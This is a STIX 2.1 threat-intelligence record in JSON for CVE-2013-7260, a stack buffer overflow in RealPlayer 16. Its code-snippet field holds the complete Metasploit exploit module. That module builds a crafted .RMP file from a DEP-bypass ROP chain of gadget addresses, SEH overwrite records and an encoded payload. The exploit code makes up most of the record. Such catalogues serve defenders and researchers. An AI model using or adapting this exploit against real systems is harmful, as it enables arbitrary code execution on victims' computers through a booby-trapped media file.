{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cba0cefa-c057-4656-8278-fed3f0ce8b73",
    "created": "2024-08-14T16:36:36.794789Z",
    "modified": "2024-08-14T16:36:36.794793Z",
    "name": "RealNetworks RealPlayer Version Attribute Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow vulnerability in version 16.0.3.51 and 16.0.2.32 of RealNetworks RealPlayer, caused by improper bounds checking of the version and encoding attributes inside the XML declaration.  By persuading the victim to open a specially-crafted .RMP file, a remote attacker could execute arbitrary code on the system or cause the application to crash.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/realplayer_ver_attribute_bof.rb",
            "external_id": "realplayer_ver_attribute_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-7260"
        },
        {
            "source_name": "reference",
            "url": "http://service.real.com/realplayer/security/12202013_player/en/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'RealNetworks RealPlayer Version Attribute Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a stack-based buffer overflow vulnerability in\n        version 16.0.3.51 and 16.0.2.32 of RealNetworks RealPlayer, caused by\n        improper bounds checking of the version and encoding attributes inside\n        the XML declaration.\n\n        By persuading the victim to open a specially-crafted .RMP file, a\n        remote attacker could execute arbitrary code on the system or cause\n        the application to crash.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Gabor Seljan' # Vulnerability discovery and Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'BID', '64695' ],\n          [ 'EDB', '30468' ],\n          [ 'OSVDB', '101356' ],\n          [ 'CVE', '2013-7260' ],\n          [ 'US-CERT-VU', '698278' ],\n          [ 'URL', 'http://service.real.com/realplayer/security/12202013_player/en/' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Platform'       => 'win',\n      'Payload'        =>\n        {\n          'BadChars'   => \"\\x00\\x22\",\n          'Space'      => 2396\n        },\n      'Targets'        =>\n        [\n          [ 'Windows XP SP2/SP3 (DEP Bypass) / RealPlayer 16.0.3.51/16.0.2.32',\n            {\n              'OffsetROP'  => 44,\n              'OffsetMenu' => 11052,      # Open via File -> Open\n              'Ret'        => 0x5acceecd  # ADD ESP,428 # RETN 10 [mswmdm.dll]\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2013-12-20',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('FILENAME', [ false, 'The file name.', 'msf.rmp'])\n        ],\n      self.class)\n\n  end\n\n  def exploit\n\n    rop_nop =\n    [\n      0x77c1c552   # RETN (ROP NOP) [msvcrt.dll]\n    ].flatten.pack('V*')\n\n    rop_gadgets =\n    [\n      0x77c21d16,  # POP EAX # RETN [msvcrt.dll]\n      0x77c11120,  # &VirtualProtect() [IAT msvcrt.dll]\n      0x77c1bb36,  # POP EBP # RETN [msvcrt.dll]\n      0x77c20497,  # skip 4 bytes [msvcrt.dll]\n      0x77c2362c,  # POP EBX # RETN [msvcrt.dll]\n      0x0000095c,  # 0x0000095C-> EBC\n      0x5acb2caf,  # POP EDX # RETN [mswmdm.dll]\n      0x00000040,  # 0x00000040-> EDX\n      0x77c1f519,  # POP ECX # RETN [msvcrt.dll]\n      0x77C5D305,  # &Writable location [msvcrt.dll]\n      0x77c23b47,  # POP EDI # RETN [msvcrt.dll]\n      0x77c47a42,  # RETN (ROP NOP) [msvcrt.dll]\n      0x77c2ed13,  # POP ESI # RETN [msvcrt.dll]\n      0x77c2aacc,  # JMP [EAX] [msvcrt.dll]\n      0x77c12df9,  # PUSHAD # RETN [msvcrt.dll]\n      0x77c35459   # PUSH ESP # RETN [msvcrt.dll]\n    ].flatten.pack('V*')\n\n    sploit =  rand_text_alpha_upper(target['OffsetROP'])\n    sploit << rop_nop\n    sploit << make_nops(16)\n    sploit << rop_gadgets\n    sploit << make_nops(16)\n    sploit << payload.encoded\n    sploit << generate_seh_record(target.ret) # Open via double click (2540)\n    sploit << rand_text_alpha_upper(target['OffsetMenu'])\n    sploit << generate_seh_record(target.ret) # Open via File -> Open (13600)\n    sploit << rand_text_alpha_upper(17000) # Generate exception\n\n    # Create the file\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n    file_create(\"<?xml version=\\\"\" + sploit + \"\\\"?>\")\n\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2013-12-20",
    "x_mitre_platforms": [
        "win'"
    ]
}